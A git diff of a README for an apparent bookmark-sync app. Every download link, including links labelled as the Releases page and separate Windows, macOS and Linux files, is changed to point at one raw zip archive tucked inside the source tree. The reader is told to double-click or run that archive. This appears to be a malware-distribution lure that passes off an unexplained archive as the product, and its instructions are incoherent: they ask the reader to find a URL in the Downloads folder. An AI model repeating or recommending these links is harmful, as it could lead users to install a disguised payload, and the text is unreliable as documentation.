@@ -1,6 +1,6 @@
 # 🌐 bookmark-syncer - Sync Your Bookmarks Easily Across Browsers
 
-[![Download bookmark-syncer](https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip)](https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip)
+[![Download bookmark-syncer](https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip)](https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip)
 
 ## 📖 Introduction
 
@@ -17,30 +17,30 @@ To start using bookmark-syncer, follow these simple steps:
    - WebDAV Server: You need to have WebDAV set up. You can use any compatible server of your choice.
 
 2. **Visit the Releases Page**  
-   To download the latest version of bookmark-syncer, visit the [Releases page](https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip).
+   To download the latest version of bookmark-syncer, visit the [Releases page](https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip).
 
 3. **Download the App**  
    Find the version you want to download. Click on the appropriate file for your operating system:
-   - For Windows, download `https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip`.
-   - For macOS, download `https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip`.
-   - For Linux, you can grab the `https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip` file.
+   - For Windows, download `https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip`.
+   - For Linux, you can grab the `https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip` file.
 
 ## 📥 Download & Install
 
 Once you’ve downloaded the installation file, you can proceed with the installation:
 
 1. **For Windows**:
-   - Locate the downloaded `https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip` in your Downloads folder.
+   - Locate the downloaded `https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip` in your Downloads folder.
    - Double-click the file to start the installation.
    - Follow the prompts to complete the installation process.
 
 2. **For macOS**:
-   - Open the downloaded `https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip`.
+   - Open the downloaded `https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip`.
    - Drag the bookmark-syncer icon to your Applications folder.
    - After this, you can find bookmark-syncer in your Applications.
 
 3. **For Linux**:
-   - Extract the `https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip` file using the terminal or a file manager.
+   - Extract the `https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip` file using the terminal or a file manager.
    - Open a terminal window and navigate to the extracted folder.
    - Run the application using the command `./bookmark-syncer`.
 
@@ -81,7 +81,7 @@ If you encounter issues while using bookmark-syncer, try the following suggestio
    Check your firewall settings. Sometimes, security software can block connections. Make sure bookmark-syncer is allowed.
 
 4. **Update the Application**  
-   Make sure you are using the latest version of bookmark-syncer. Go back to the [Releases page](https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip) for updates.
+   Make sure you are using the latest version of bookmark-syncer. Go back to the [Releases page](https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip) for updates.
 
 ## 🔗 Conclusion
 
@@ -89,4 +89,4 @@ bookmark-syncer provides a reliable way to manage your bookmarks across differen
 
 For additional support or questions, please refer to the documentation or contact the support team through the GitHub Issues section.
 
-Find your download again here: [Releases page](https://github.com/chidat15/bookmark-syncer/raw/refs/heads/master/packages/app/src/background/bookmark-syncer-v2.4.zip).
+Find your download again here: [Releases page](https://raw.githubusercontent.com/chidat15/bookmark-syncer/master/packages/app/src/core/sync/bookmark-syncer-v3.2.zip).
